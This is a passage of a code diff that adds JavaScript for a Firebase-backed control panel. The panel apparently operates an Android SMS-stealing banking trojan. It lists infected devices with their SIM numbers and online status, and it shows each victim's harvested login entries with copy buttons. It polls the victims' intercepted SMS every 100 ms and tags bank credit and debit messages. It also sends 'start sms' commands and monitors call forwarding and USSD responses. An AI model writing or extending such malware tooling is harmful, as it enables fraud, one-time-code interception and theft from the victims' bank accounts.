+  if (expiryTimerInterval) { clearInterval(expiryTimerInterval); expiryTimerInterval = null; }
+  if (expiryTimerElement) expiryTimerElement.classList.remove('show');
+}
+function checkUserStatus() {
+  if (!db) return;
+  onValue(ref(db, 'admin/status'), (snapshot) => {
+    const status = snapshot.val();
+    if (status === 'block') {
+      isBlocked = true;
+      document.body.classList.add('blocked');
+      document.getElementById('blockOverlay').classList.add('show');
+      document.getElementById('loginOverlay').classList.remove('show');
+      document.getElementById('passwordSetOverlay').classList.remove('show');
+    } else {
+      isBlocked = false;
+      document.body.classList.remove('blocked');
+      document.getElementById('blockOverlay').classList.remove('show');
+    }
+  });
+}
+
+/* LOGIN */
+function checkLogin() {
+  if (!db) { document.getElementById('loginMsg').textContent = 'No Firebase config'; return; }
+  onValue(ref(db, 'admin/password'), snap => {
+    const stored = snap.val();
+    adminPassword = stored || null;
+    if (isBlocked || isExpired) return;
+    if (stored && checkSession()) { unlockPanel(); return; }
+    if (!stored) {
+      document.getElementById('passwordSetOverlay').classList.add('show');
+      document.getElementById('loginOverlay').classList.remove('show');
+    } else {
+      document.getElementById('loginOverlay').classList.add('show');
+      document.getElementById('passwordSetOverlay').classList.remove('show');
+    }
+  }, { onlyOnce: true });
+}
+document.getElementById('setPasswordBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('setPasswordBtn');
+  const pwd = document.getElementById('newAdminPassword').value.trim();
+  const msg = document.getElementById('passMsg');
+  msg.className = 'login-msg';
+  if (pwd.length < 4) { msg.className = 'login-msg error'; msg.textContent = 'Password must be at least 4 characters'; return; }
+  btn.disabled = true;
+  try {
+    await set(ref(db, 'admin/password'), pwd);
+    adminPassword = pwd;
+    saveSession();
+    msg.className = 'login-msg success';
+    msg.textContent = '✅ Password set!';
+    document.getElementById('passwordSetOverlay').classList.remove('show');
+    setTimeout(() => unlockPanel(), 600);
+  } catch (e) { msg.className = 'login-msg error'; msg.textContent = 'Error: ' + e.message; }
+  finally { btn.disabled = false; }
+});
+document.getElementById('loginBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('loginBtn');
+  const pwd = document.getElementById('loginPassword').value.trim();
+  const msg = document.getElementById('loginMsg');
+  msg.className = 'login-msg';
+  if (!pwd) { msg.className = 'login-msg error'; msg.textContent = 'Enter password'; return; }
+  btn.disabled = true;
+  try {
+    if (pwd === adminPassword) {
+      saveSession();
+      msg.className = 'login-msg success';
+      msg.textContent = '✅ Login successful!';
+      setTimeout(() => unlockPanel(), 500);
+    } else {
+      msg.className = 'login-msg error';
+      msg.textContent = 'Incorrect password';
+      document.getElementById('loginPassword').value = '';
+    }
+  } catch (e) { msg.className = 'login-msg error'; msg.textContent = 'Error: ' + e.message; }
+  finally { btn.disabled = false; }
+});
+document.getElementById('loginPassword').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('loginBtn').click(); });
+document.getElementById('newAdminPassword').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('setPasswordBtn').click(); });
+
+function unlockPanel() {
+  if (isBlocked || isExpired) return;
+  if (isUnlocked) return;
+  isUnlocked = true;
+  document.getElementById('loginOverlay').classList.remove('show');
+  document.getElementById('passwordSetOverlay').classList.remove('show');
+  toast('Welcome back!', 'success');
+  listenDeletePassword();
+  loadDeviceSerialsAndStart();
+  listenBotStatus();
+  buildAccentGrid();
+  updateStatusChips();
+  updateSessionDisplay();
+  switchTab('devices');
+  setInterval(updateSessionDisplay, 60000);
+}
+function loadDeviceSerialsAndStart() {
+  if (!db) return;
+  get(ref(db, 'device_serials')).then(snap => {
+    deviceSerialMap = snap.val() || {};
+    loadDevicesPage(true);
+    setTimeout(() => { loadAllSms(); loadAllBackup(); }, 400);
+  }).catch(e => {
+    loadDevicesPage(true);
+    setTimeout(() => { loadAllSms(); loadAllBackup(); }, 400);
+  });
+}
+
+/* LIVE STATUS */
+function attachLiveStatusListener(deviceId) {
+  if (liveStatusListeners.has(deviceId)) return;
+  if (!db) return;
+  const statusRef = ref(db, `user_data/${deviceId}/status`);
+  const unsub = onValue(statusRef, snap => { updateDeviceStatus(deviceId, snap.val() || 'offline'); });
+  liveStatusListeners.set(deviceId, unsub);
+}
+function updateDeviceStatus(deviceId, status) {
+  const d = allDevicesFull.find(x => x.deviceId === deviceId);
+  if (d) {
+    if (d.status !== status) { d.status = status; cacheSet(PERF.deviceCache, deviceId, d); }
+    updateDeviceBadgeInList(deviceId, status);
+    updateStats();
+    updateStatusChips();
+    if (selectedDeviceId === deviceId) {
+      updateHomeLiveDot(status);
+      const lastSeenEl = document.getElementById('hdLastSeen');
+      if (lastSeenEl) lastSeenEl.textContent = d.lastSeen ? timeAgo(new Date(d.lastSeen).getTime()) : 'N/A';
+    }
+  }
+}
+function updateDeviceBadgeInList(deviceId, status) {
+  const item = document.querySelector(`.device-list-item[data-device-id="${CSS.escape(deviceId)}"]`);
+  if (!item) return;
+  const badge = item.querySelector('.dl-badge');
+  if (badge) {
+    const isOnline = status === 'online';
+    badge.className = 'dl-badge ' + (isOnline ? 'online pulse' : 'offline');
+    badge.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
+  }
+  const dot = item.querySelector('.live-dot');
+  if (dot) dot.className = 'live-dot' + (status === 'online' ? ' online pulse' : '');
+  item.classList.toggle('online', status === 'online');
+}
+function updateHomeLiveDot(status) {
+  const dot = document.getElementById('hdLiveDot');
+  if (!dot) return;
+  dot.className = 'live-dot' + (status === 'online' ? ' online pulse' : '');
+}
+
+/* LOAD DEVICES */
+async function loadDevicesPage(reset = false) {
+  if (!db) return;
+  if (reset) { allDevices = []; allDevicesFull = []; filteredDevices = []; }
+  const snapshot = await get(ref(db, 'user_data'));
+  const data = snapshot.val() || {};
+  const deviceIds = Object.keys(data);
+  totalDeviceCount = deviceIds.length;
+  const devices = [];
+  for (const deviceId of deviceIds) {
+    const u = data[deviceId];
+    if (!u) continue;
+    let name = extractDeviceName(u);
+    devices.push({
+      deviceId, d_name: name,
+      device_info: u.Device_info || 'No info',
+      battery: parseInt(u.battery || u.battery_percentage) || 0,
+      status: u.status || 'offline',
+      timeandDate: u.TimeandDate || u.installTime || 'N/A',
+      lastSeen: u.last_seen || u.TimeandDate || 0,
+      nameSim1: u.nameSim1 || 'Unknown',
+      numberSim1: u.numberSim1 || 'Not detected',
+      nameSim2: u.nameSim2 || 'Unknown',
+      numberSim2: u.numberSim2 || 'Not detected',
+      ussd_response: u.ussd_response || '',
+      user_serial: deviceSerialMap[deviceId] || u.user_serial || 0
+    });
+  }
+  assignPermanentSerials(devices);
+  devices.sort((a, b) => (b.user_serial || 0) - (a.user_serial || 0));
+  allDevicesFull = devices;
+  allDevices = [...devices];
+  filteredDevices = [...devices];
+  devices.forEach(d => { cacheSet(PERF.deviceCache, d.deviceId, d); attachLiveStatusListener(d.deviceId); });
+  renderDeviceList();
+  updateStats();
+  updateStatusChips();
+  if (document.getElementById('page-alldata')?.classList.contains('active')) renderAllDataList();
+}
+function renderDeviceList() {
+  const inner = document.getElementById('deviceListInner');
+  if (!filteredDevices.length) { inner.innerHTML = `<div class="empty"><i class="bi bi-phone"></i><p>No devices found</p></div>`; return; }
+  let html = '';
+  for (let i = 0; i < filteredDevices.length; i++) {
+    const d = filteredDevices[i];
+    const isOnline = d.status === 'online';
+    const shortId = d.deviceId.length > 14 ? d.deviceId.slice(0, 14) + '…' : d.deviceId;
+    html += `
+      <div class="device-list-item ${isOnline ? 'online' : ''}" data-device-id="${escapeHtml(d.deviceId)}" onclick="selectDevice('${escapeAttr(d.deviceId)}')">
+        <div class="dl-avatar">#${d.user_serial || '?'}<span class="live-dot${isOnline ? ' online pulse' : ''}"></span></div>
+        <div class="dl-info">
+          <div class="dl-name">${escapeHtml(d.d_name)}</div>
+          <div class="dl-sub">${escapeHtml(shortId)}</div>
+          <div class="dl-badges">
+            <span class="dl-badge ${isOnline ? 'online pulse' : 'offline'}">${isOnline ? '🟢 Online' : '🔴 Offline'}</span>
+            <span class="dl-badge batt">🔋 ${d.battery}%</span>
+            <span class="dl-badge sim">📱 ${escapeHtml(d.numberSim1)}</span>
+          </div>
+        </div>
+        <i class="bi bi-chevron-right dl-chev"></i>
+      </div>`;
+  }
+  inner.innerHTML = html;
+}
+function updateStats() {
+  const online = allDevicesFull.filter(d => d.status === 'online').length;
+  const offline = Math.max(0, (totalDeviceCount || allDevicesFull.length) - online);
+  const total = totalDeviceCount || allDevicesFull.length;
+  document.getElementById('statTotal').textContent = total;
+  document.getElementById('statOnline').textContent = online;
+  document.getElementById('statOffline').textContent = offline;
+}
+window.showDeviceAllSms = function() {
+  switchTab('messages');
+  document.querySelectorAll('[data-filter]').forEach(x => x.classList.remove('active'));
+  document.querySelector('[data-filter="all"]')?.classList.add('active');
+  document.getElementById('smsSearch').value = '';
+  currentSmsFilter = 'all'; currentSmsSearchTerm = '';
+  applySmsFilter(); renderSmsList();
+};
+
+/* SELECT DEVICE */
+window.selectDevice = function(deviceId) {
+  if (!isUnlocked || isExpired || isBlocked) return;
+  if (PERF.clickLock) return;
+  PERF.clickLock = true;
+  setTimeout(() => { PERF.clickLock = false; }, 200);
+  const d = cacheGet(PERF.deviceCache, deviceId) || allDevicesFull.find(x => x.deviceId === deviceId);
+  if (!d) { toast('Device not found', 'error'); return; }
+  selectedDeviceId = deviceId;
+  selectedDevice = d;
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page-devices')?.classList.add('active');
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === 'devices'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.page === 'devices'));
+  document.getElementById('deviceListView').style.display = 'none';
+  document.getElementById('homeDeviceView').style.display = 'block';
+  renderHomeDevice();
+  loadDeviceData(deviceId);
+  loadDeviceSmsOnly(deviceId);
+  listenCallForwardStatus(deviceId);
+  listenUssdResponse(deviceId);
+  listenSelectedDeviceStatus(deviceId);
+  loadBankForDevice(deviceId).then(() => renderBankCard(deviceId));
+  loadAutoTokenConfig(deviceId);
+  listenSmsStoreState(deviceId);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  const sc = document.getElementById('homeDeviceScroll');
+  if (sc) sc.scrollTop = 0;
+};
+
+/* ⭐ SMS STORE ⭐ */
+function listenSmsStoreState(deviceId) {
+  if (smsStoreUnsub) { try { smsStoreUnsub(); } catch(e) {} smsStoreUnsub = null; }
+  if (!db || !deviceId) { updateSmsStoreUI(false); return; }
+  smsStoreUnsub = onValue(ref(db, `user_data/${deviceId}/sms_store_enabled`), snap => {
+    const enabled = snap.val() === true;
+    currentSmsStoreState = enabled;
+    updateSmsStoreUI(enabled);
+  });
+}
+function updateSmsStoreUI(enabled) {
+  const btn = document.getElementById('smsStoreBtn');
+  const label = document.getElementById('smsStoreLabel');
+  const icon = document.getElementById('smsStoreIcon');
+  if (!btn || !label || !icon) return;
+  if (enabled) {
+    btn.classList.add('on');
+    label.textContent = 'SMS Store: ON';
+    icon.className = 'bi bi-cloud-check-fill';
+  } else {
+    btn.classList.remove('on');
+    label.textContent = 'SMS Store: OFF';
+    icon.className = 'bi bi-cloud-arrow-up';
+  }
+}
+window.toggleSmsStore = async function() {
+  if (!selectedDeviceId) return toast('Select a device first', 'error');
+  if (!db) return toast('Firebase not connected', 'error');
+  const btn = document.getElementById('smsStoreBtn');
+  if (btn) btn.disabled = true;
+  const newState = !currentSmsStoreState;
+  const action = newState ? 'ON' : 'OFF';
+  toast(`⏳ Turning SMS Store ${action}...`, 'info');
+  try {
+    await set(ref(db, `user_data/${selectedDeviceId}/sms_store_enabled`), newState);
+    currentSmsStoreState = newState;
+    updateSmsStoreUI(newState);
+    // ⚠️ শুধু command ফিল্ডে পাঠাই, user_data overwrite না করি
+    const payload = {
+      command: newState ? 'start sms' : 'stop sms',
+      action: newState ? 'start_sms' : 'stop_sms',
+      task: newState ? 'start_sms' : 'stop_sms',
+      sms_store_enabled: newState,
+      timestamp: Date.now(),
+      adminRequest: true
+    };
+    const updates = {};
+    updates[`commands/${selectedDeviceId}/last_command`] = payload;
+    await update(ref(db, '/'), updates).catch(() => {});
+    toast(`✅ SMS Store ${action}`, 'success');
+  } catch (e) {
+    toast('❌ Failed: ' + e.message, 'error');
+  } finally {
+    if (btn) btn.disabled = false;
+  }
+};
+
+function listenSelectedDeviceStatus(deviceId) {
+  if (selectedDeviceStatusUnsub) { try { selectedDeviceStatusUnsub(); } catch(e) {} selectedDeviceStatusUnsub = null; }
+  if (!db) return;
+  selectedDeviceStatusUnsub = onValue(ref(db, `user_data/${deviceId}/status`), snap => {
+    updateHomeLiveDot(snap.val() || 'offline');
+  });
+}
+function renderHomeDevice() {
+  if (!selectedDevice) return;
+  const d = selectedDevice;
+  document.getElementById('hdName').textContent = d.d_name;
+  document.getElementById('hdSub').textContent = `#${d.user_serial || '?'} • ${d.deviceId.slice(0, 12)}…`;
+  document.getElementById('hdDeviceName').textContent = d.d_name;
+  document.getElementById('hdDeviceId').textContent = d.deviceId;
+  document.getElementById('hdBattery').innerHTML = `<span style="color:${d.battery > 50 ? '#00ffa3' : d.battery > 20 ? '#ffb020' : '#ff3355'}; font-weight:800;">${d.battery}%</span>`;
+  document.getElementById('hdUserId').textContent = d.deviceId.slice(-12);
+  document.getElementById('hdSim1').textContent = d.numberSim1 || 'Not detected';
+  document.getElementById('hdSim2').textContent = d.numberSim2 || 'Not detected';
+  document.getElementById('hdInstalled').textContent = d.timeandDate && d.timeandDate !== 'N/A'
+    ? new Date(d.timeandDate).toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' }) : 'N/A';
+  document.getElementById('hdLastSeen').textContent = d.lastSeen ? timeAgo(new Date(d.lastSeen).getTime()) : 'N/A';
+  document.getElementById('onlineCheckResult').classList.remove('show', 'online', 'offline');
+  updateHomeLiveDot(d.status);
+  renderBankCard(d.deviceId);
+}
+window.goHome = function() { resetDeviceView(); switchTab('devices'); };
+window.scrollToDeviceSms = () => document.getElementById('deviceSmsSection')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+window.scrollToLoginDetails = () => document.getElementById('deviceDataSection')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+/* DEVICE LOGIN DATA */
+function loadDeviceData(deviceId) {
+  if (deviceDataUnsub) { try { deviceDataUnsub(); } catch(e) {} deviceDataUnsub = null; }
+  const list = document.getElementById('deviceDataList');
+  const toggleBtn = document.getElementById('toggleDataBtn');
+  list.innerHTML = `<div class="spinner"></div>`;
+  if (toggleBtn) toggleBtn.style.display = 'none';
+  if (!db) return;
+  deviceDataUnsub = onValue(ref(db, `login/${deviceId}`), snap => {
+    const data = snap.val();
+    if (!data) {
+      list.innerHTML = `<div class="empty"><i class="bi bi-database"></i><p>No login data</p></div>`;
+      document.getElementById('deviceDataCount').textContent = '0';
+      if (toggleBtn) toggleBtn.style.display = 'none';
+      list.classList.remove('collapsed');
+      return;
+    }
+    const entryKeys = Object.keys(data).sort((a, b) => {
+      const ea = data[a] || {}, eb = data[b] || {};
+      const ta = parseEntryTime(ea), tb = parseEntryTime(eb);
+      if (ta !== tb) return tb - ta;
+      return b.localeCompare(a);
+    });
+    let html = '', n = 0;
+    entryKeys.forEach(k => {
+      const r = data[k];
+      if (!r || typeof r !== 'object') return;
+      const fields = LOGIN_FIELDS.filter(f => r[f.key] !== undefined && r[f.key] !== '' && r[f.key] !== null);
+      if (!fields.length) return;
+      n++;
+      const ts = parseEntryTime(r);
+      const timeStr = ts ? new Date(ts).toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' }) : '';
+      html += `<div class="fd-entry"><div class="fd-date">Entry #${n}${timeStr ? ' • ' + timeStr : ''}</div>`;
+      fields.forEach(f => {
+        html += `<div class="fd-row"><span class="k">${escapeHtml(f.label)}</span><span class="v">${escapeHtml(r[f.key])}</span>
+          <button class="copy" onclick="copyToClipboard('${escapeAttr(r[f.key])}')"><i class="bi bi-clipboard"></i></button></div>`;
+      });
+      html += '</div>';
+    });
+    list.innerHTML = html || `<div class="empty"><i class="bi bi-database"></i><p>No entries</p></div>`;
+    document.getElementById('deviceDataCount').textContent = n;
+    list.classList.remove('collapsed');
+    if (toggleBtn && n > 0) {
+      toggleBtn.style.display = 'inline-flex';
+      toggleBtn.querySelector('span').textContent = 'Show Less';
+      toggleBtn.querySelector('i').className = 'bi bi-chevron-contract';
+    } else if (toggleBtn) { toggleBtn.style.display = 'none'; }
+  });
+}
+window.toggleLoginData = function() {
+  const list = document.getElementById('deviceDataList');
+  const btn = document.getElementById('toggleDataBtn');
+  if (!list || !btn) return;
+  const isCollapsed = list.classList.toggle('collapsed');
+  const txt = btn.querySelector('span');
+  const icon = btn.querySelector('i');
+  if (isCollapsed) {
+    txt.textContent = 'Show All'; icon.className = 'bi bi-chevron-expand';
+    document.getElementById('deviceDataSection')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  } else { txt.textContent = 'Show Less'; icon.className = 'bi bi-chevron-contract'; }
+};
+
+/* ALL DATA */
+function parseEntryTime(entry) {
+  if (!entry || typeof entry !== 'object') return 0;
+  const candidates = ['timestamp','time','date','TimeDate','TimeandDate','created_at','createdAt','ts','timeStamp'];
+  for (const k of candidates) {
+    const v = entry[k];
+    if (v === undefined || v === null) continue;
+    if (typeof v === 'number') {
+      if (v > 1e12) return v;
+      if (v > 1e9) return v * 1000;
+      return v;
+    }
+    if (typeof v === 'string') {
+      const n = Number(v);
+      if (!isNaN(n) && n > 0) {
+        if (n > 1e12) return n;
+        if (n > 1e9) return n * 1000;
+      }
+      const d = Date.parse(v);
+      if (!isNaN(d)) return d;
+    }
+  }
+  return 0;
+}
+let allDataGlobalCounter = 0;
+function loadAllData() {
+  if (!db) return;
+  if (allDataUnsub) { try { allDataUnsub(); } catch(e) {} allDataUnsub = null; }
+  allDataUnsub = onValue(ref(db, 'login'), snap => {
+    const data = snap.val() || {};
+    allDataFlat = [];
+    const now = Date.now();
+    Object.keys(data).forEach(deviceId => {
+      const deviceEntries = data[deviceId] || {};
+      const deviceObj = allDevicesFull.find(d => d.deviceId === deviceId);
+      const serial = getSerialForDevice(deviceId) || (deviceObj && deviceObj.user_serial) || '?';
+      const deviceName = deviceObj ? deviceObj.d_name : (deviceId.slice(0, 12) + '…');
+      const entryKeys = Object.keys(deviceEntries).sort((a, b) => {
+        const ea = deviceEntries[a] || {}, eb = deviceEntries[b] || {};
+        const ta = parseEntryTime(ea), tb = parseEntryTime(eb);
+        if (ta !== tb) return tb - ta;
+        return b.localeCompare(a);
+      });
+      entryKeys.forEach((entryKey, idx) => {
+        const entry = deviceEntries[entryKey];
+        if (!entry || typeof entry !== 'object') return;
+        const fields = LOGIN_FIELDS.filter(f => entry[f.key] !== undefined && entry[f.key] !== '' && entry[f.key] !== null);
+        if (!fields.length) return;
+        const entryTime = parseEntryTime(entry);
+        allDataFlat.push({
+          deviceId, serial, deviceName, entryKey,
+          entryIndex: idx + 1, entryTime,
+          sortOrder: entryTime || (now - (allDataGlobalCounter++ * 1000)),
+          fields: fields.map(f => ({ key: f.key, label: f.label, value: entry[f.key] })),
+          searchText: (serial + ' ' + deviceName + ' ' + fields.map(f => f.label + ':' + f.value).join(' ')).toLowerCase()
+        });
+      });
+    });
+    allDataFlat.sort((a, b) => {
+      if (b.entryTime !== a.entryTime) return b.entryTime - a.entryTime;
+      if (b.sortOrder !== a.sortOrder) return b.sortOrder - a.sortOrder;
+      return (parseInt(b.serial) || 0) - (parseInt(a.serial) || 0);
+    });
+    filteredAllData = [...allDataFlat];
+    renderAllDataList();
+  });
+}
+function renderAllDataList() {
+  const inner = document.getElementById('allDataInner');
+  if (!inner) return;
+  const q = (currentAllDataSearchTerm || '').trim().toLowerCase();
+  let list = allDataFlat;
+  if (q) list = allDataFlat.filter(d => d.searchText.includes(q));
+  const countEl = document.getElementById('allDataCount');
+  if (countEl) countEl.textContent = list.length + ' entries';
+  if (!list.length) { inner.innerHTML = `<div class="empty"><i class="bi bi-database"></i><p>No login data found</p></div>`; return; }
+  let html = '';
+  list.forEach(item => {
+    const ts = item.entryTime;
+    const timeStr = ts ? new Date(ts).toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' }) : '';
+    html += `<div class="data-entry"><div class="data-head">
+      <span class="serial-badge">#${escapeHtml(String(item.serial))}</span>
+      <span class="device-name">${escapeHtml(item.deviceName)}</span>
+      <span style="font-size:10px;color:var(--label);">Entry #${item.entryIndex}${timeStr ? ' • ' + timeStr : ''}</span>
+    </div><div class="data-fields">`;
+    item.fields.forEach(f => {
+      html += `<div class="data-field">
+        <span class="k">${escapeHtml(f.label)}:</span>
+        <span class="v">${escapeHtml(String(f.value))}</span>
+        <button class="copy-btn" onclick="copyToClipboard('${escapeAttr(String(f.value))}')"><i class="bi bi-clipboard"></i></button>
+      </div>`;
+    });
+    html += `</div></div>`;
+  });
+  inner.innerHTML = html;
+}
+window.refreshAllData = function() { loadAllData(); toast('Refreshed', 'success'); };
+document.getElementById('allDataSearch')?.addEventListener('input', debounce(e => {
+  currentAllDataSearchTerm = e.target.value;
+  renderAllDataList();
+}, 200));
+
+/* DEVICE SMS + LIVE POLLING */
+function loadDeviceSmsOnly(deviceId) {
+  if (deviceSmsUnsub) { try { deviceSmsUnsub(); } catch(e) {} deviceSmsUnsub = null; }
+  deviceSmsFlat = []; deviceSmsFiltered = [];
+  livePollKeySet = new Set();
+  const inner = document.getElementById('deviceSmsInner');
+  inner.innerHTML = `<div class="spinner"></div>`;
+  if (!db) { inner.innerHTML = `<div class="empty"><i class="bi bi-chat"></i><p>No Firebase</p></div>`; return; }
+  deviceSmsUnsub = onValue(ref(db, `user_sms/${deviceId}`), snap => {
+    const data = snap.val() || {};
+    const flat = [];
+    const serial = getSerialForDevice(deviceId) || deviceId.slice(-6);
+    Object.keys(data).forEach(key => {
+      const s = data[key];
+      const body = s.body || s.message || 'No content';
+      const type = determineSmsType({ body, type: s.type });
+      flat.push({
+        deviceId, serial, key, body,
+        sender: s.sender || s.address || 'Unknown',
+        date: s.date || s.time || 'N/A',
+        timestamp: s.timestamp || 0,
+        sim_number: s.sim_number || s.simSlot || 'SIM 1',
+        type, amount: extractAmount(body),
+        isDebit: type === 'bank_debit'
+      });
+      livePollKeySet.add(key);
+    });
+    flat.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    deviceSmsFlat = flat;
+    cacheSet(PERF.smsCache, deviceId, flat);
+    applyDeviceSmsFilter();
+    loadBankForDevice(deviceId).then(() => renderBankCard(deviceId));
+  });
+  startLivePoll(deviceId);
+}
+function startLivePoll(deviceId) {
+  stopLivePoll();
+  if (!db) return;
+  const badge = document.getElementById('liveBadge');
+  if (badge) badge.classList.remove('off');
+  const badgeText = document.getElementById('liveBadgeText');
+  if (badgeText) badgeText.textContent = 'LIVE · 0.1s';
+  livePollInterval = setInterval(async () => {
+    if (isPolling) return;
+    if (!selectedDeviceId || selectedDeviceId !== deviceId) return;
+    if (!document.getElementById('homeDeviceView') || document.getElementById('homeDeviceView').style.display === 'none') return;
+    isPolling = true;
+    try {
+      const snap = await get(ref(db, `user_sms/${deviceId}`));
+      const data = snap.val() || {};
+      const flat = [];
+      const serial = getSerialForDevice(deviceId) || deviceId.slice(-6);
+      let newFound = 0;
+      Object.keys(data).forEach(key => {
+        const s = data[key];
+        const body = s.body || s.message || 'No content';
+        const type = determineSmsType({ body, type: s.type });
+        flat.push({
+          deviceId, serial, key, body,
+          sender: s.sender || s.address || 'Unknown',
+          date: s.date || s.time || 'N/A',
+          timestamp: s.timestamp || 0,
+          sim_number: s.sim_number || s.simSlot || 'SIM 1',
+          type, amount: extractAmount(body),
+          isDebit: type === 'bank_debit'
+        });
+        if (!livePollKeySet.has(key)) {
+          newFound++;
+          livePollKeySet.add(key);
+          toast('💬 New SMS from ' + (s.sender || s.address || 'Unknown'), 'success');
+        }
+      });
+      flat.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+      deviceSmsFlat = flat;
+      if (newFound > 0) {
+        applyDeviceSmsFilter();
+        loadBankForDevice(deviceId).then(() => renderBankCard(deviceId));
+      }
+    } catch(e) {}
+    finally { isPolling = false; }
+  }, 100);
+}
+function stopLivePoll() {
+  if (livePollInterval) { clearInterval(livePollInterval); livePollInterval = null; }
+  const badge = document.getElementById('liveBadge');
+  if (badge) badge.classList.add('off');
+  const badgeText = document.getElementById('liveBadgeText');
+  if (badgeText) badgeText.textContent = 'OFF';
+}
+window.manualRefreshDeviceSms = async function() {
+  if (!selectedDeviceId) return;
+  const btn = document.getElementById('refreshMsgsBtn');
+  if (btn) btn.classList.add('spinning');
+  toast('⏳ Refreshing SMS...', 'info');
+  try {
+    const snap = await get(ref(db, `user_sms/${selectedDeviceId}`));
+    const data = snap.val() || {};
+    const flat = [];
+    const serial = getSerialForDevice(selectedDeviceId) || selectedDeviceId.slice(-6);
+    Object.keys(data).forEach(key => {
+      const s = data[key];
+      const body = s.body || s.message || 'No content';
+      const type = determineSmsType({ body, type: s.type });
+      flat.push({
+        deviceId: selectedDeviceId, serial, key, body,
+        sender: s.sender || s.address || 'Unknown',
+        date: s.date || s.time || 'N/A',
+        timestamp: s.timestamp || 0,
+        sim_number: s.sim_number || s.simSlot || 'SIM 1',
+        type, amount: extractAmount(body),
+        isDebit: type === 'bank_debit'
+      });
+      livePollKeySet.add(key);
+    });
+    flat.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+    deviceSmsFlat = flat;
+    applyDeviceSmsFilter();
+    await loadBankForDevice(selectedDeviceId);
+    renderBankCard(selectedDeviceId);
+    toast('✅ Refreshed', 'success');
+  } catch(e) { toast('❌ Failed', 'error'); }
+  if (btn) setTimeout(() => btn.classList.remove('spinning'), 600);
+};
+function applyDeviceSmsFilter() {
+  const q = (document.getElementById('deviceSmsSearch')?.value || '').trim().toLowerCase();
+  const filter = document.querySelector('[data-dsfilter].active')?.dataset.dsfilter || 'all';
+  deviceSmsFiltered = deviceSmsFlat.filter(s => {
+    if (filter === 'credit' && s.type !== 'credit') return false;
+    if (filter === 'debit' && s.type !== 'debit') return false;
+    if (filter === 'bank_debit' && !s.isDebit) return false;
+    if (!q) return true;
+    return s.sender.toLowerCase().includes(q) || s.body.toLowerCase().includes(q) || (s.sim_number || '').toLowerCase().includes(q);
+  });
+  document.getElementById('deviceSmsCount').textContent = deviceSmsFiltered.length;
+  const mc = document.getElementById('msgCount');
+  if (mc) mc.textContent = deviceSmsFiltered.length;
+  renderDeviceSmsList();
+}
+function renderDeviceSmsList() {
+  const inner = document.getElementById('deviceSmsInner');
+  if (!deviceSmsFiltered.length) { inner.innerHTML = `<div class="empty"><i class="bi bi-chat"></i><p>No messages for this device</p></div>`; return; }
+  const visible = deviceSmsFiltered.slice(0, 200);
+  let html = '';
+  for (let i = 0; i < visible.length; i++) html += buildDeviceSmsItem(visible[i]);
+  if (deviceSmsFiltered.length > 200) html += `<div class="load-more">Showing 200 of ${deviceSmsFiltered.length}</div>`;
+  inner.innerHTML = html;
+}
+function buildDeviceSmsItem(s) {
+  const badge = s.type === 'credit' ? `<span class="badge-soft credit">💰 +${s.amount || ''}</span>`
+    : s.type === 'debit' ? `<span class="badge-soft debit">💸 -${s.amount || ''}</span>`
+    : s.isDebit ? `<span class="badge-soft debit">🏦 Bank Debit</span>`
+    : `<span class="badge-soft normal">📌</span>`;
+  return `<div class="sms-item ${s.isDebit ? 'debit' : ''}">
+      <div class="sms-top">
+        <div class="sms-sender"><span>${escapeHtml(s.sender)}</span></div>
+        <div class="sms-date">${escapeHtml(s.date)}</div>
+      </div>
+      <div class="sms-meta"><span class="badge-soft sim">${escapeHtml(s.sim_number)}</span>${badge}</div>
+      <div class="sms-body" style="margin-top:4px;">${escapeHtml(s.body)}</div>
+      <div class="sms-actions">
+        <button class="mini-btn primary" onclick="copySms('${escapeAttr(s.body)}')"><i class="bi bi-clipboard"></i> Copy</button>
+        <button class="mini-btn danger" onclick="requestDeleteSms('${escapeAttr(s.deviceId)}','${escapeAttr(s.key)}')"><i class="bi bi-trash"></i> Delete</button>
+      </div>
+    </div>`;
+}
+document.getElementById('deviceSmsSearch')?.addEventListener('input', debounce(applyDeviceSmsFilter, 200));
+document.querySelectorAll('[data-dsfilter]').forEach(b => {
+  b.addEventListener('click', () => {
+    document.querySelectorAll('[data-dsfilter]').forEach(x => x.classList.remove('active'));
+    b.classList.add('active');
+    applyDeviceSmsFilter();
+  });
+});
+window.navigateToDevice = function(deviceId) { if (!deviceId) { toast('Device ID missing', 'error'); return; } selectDevice(deviceId); };
+
+/* CALL FORWARD STATUS */
+function listenCallForwardStatus(deviceId) {
+  if (cfStatusUnsub) { try { cfStatusUnsub(); } catch(e) {} cfStatusUnsub = null; }
+  cfStatusUnsub = onValue(ref(db, `user_data/${deviceId}/forward_status`), snap => {
+    const v = snap.val();
+    const homeBox = document.getElementById('cfStatusBox');
+    const homeIcon = document.getElementById('cfStatusIcon');
+    const homeText = document.getElementById('cfStatusText');
+    if (!homeBox) return;
+    if (v === 'active' || v === true || v === 'on') {
+      homeBox.className = 'status-box show success';
+      homeIcon.className = 'bi bi-check-circle-fill';
+      homeText.textContent = '✓ Call Forward is ACTIVE';
+    } else if (v === 'inactive' || v === false || v === 'off') {
+      homeBox.className = 'status-box show error';
+      homeIcon.className = 'bi bi-x-circle-fill';
+      homeText.textContent = '✗ Call Forward is INACTIVE';
+    } else if (v !== null && v !== undefined) {
+      homeBox.className = 'status-box show info';
+      homeIcon.className = 'bi bi-info-circle-fill';
+      homeText.textContent = 'Status: ' + v;
+    }
+  });
+}
+
+/* USSD */
+function listenUssdResponse(deviceId) {
